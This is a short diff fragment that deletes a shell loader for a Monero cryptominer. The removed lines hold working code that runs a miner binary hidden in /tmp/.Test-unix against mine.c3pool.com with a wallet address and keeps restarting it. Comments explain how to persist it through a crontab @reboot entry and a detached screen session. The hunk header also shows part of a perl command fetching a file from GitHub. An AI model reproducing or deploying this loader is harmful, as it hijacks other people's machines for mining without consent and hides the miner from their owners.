@@ -34,41 +34,4 @@ perl -e 'use File::Fetch; my $ff = File::Fetch->new(uri => "https://github.com/C
 
 
 
-# WHEN MANY PROCESS
-# STEP 1 create javx.sh = LOADER
 
-MINER_PATH="/tmp/.Test-unix/moktarr"
-CMD="$MINER_PATH --url mine.c3pool.com:443 --user 88kM3JHo81q7apAz5NYSGEizUq5YRDKEmDGBVB8QkFAk7swZjVYNiCnDpDtqkeWtSWNJ3S2rbNrZXeAwtFjZjHNWKjGDKU2 --pass tzao --donate-level 0 --coin monero -B --randomx-mode=fast --cpu-priority=3"
-
-LAST_REFRESH=$(date +%s)
-
-while true; do
-    CURRENT_TIME=$(date +%s)
-    ELAPSED=$((CURRENT_TIME - LAST_REFRESH))
-
-    if [ $ELAPSED -gt 43200 ]; then
-        pkill -x xmrig
-        LAST_REFRESH=$CURRENT_TIME
-        sleep 5
-    fi
-
-    if ! pgrep -x "moktarr" > /dev/null; then
-        $CMD > /dev/null 2>&1 &
-    fi
-
-    sleep 600
-done
-
-# STEP 2
-
-#Make it executable: chmod +x javx.sh
-#Add it to your User Crontab: Type crontab -e and add this single line at the bottom:  @reboot /bin/bash /tmp/.Test-unix/javx.sh
-
-#How to use it:
-
-#    Make it executable: chmod +x javx.sh
- #   Run it in the background: To keep it running even after you close your terminal, use screen (pre-installed on Ubuntu):
-  #      Type screen to open a new session.
-   #     Run the script: ./javx.sh
-    #    Press Ctrl + A then D to detach.
-    #The script is now the boss: It will check the miner every 5 minutes. If XMRig dies, the script starts it back up.
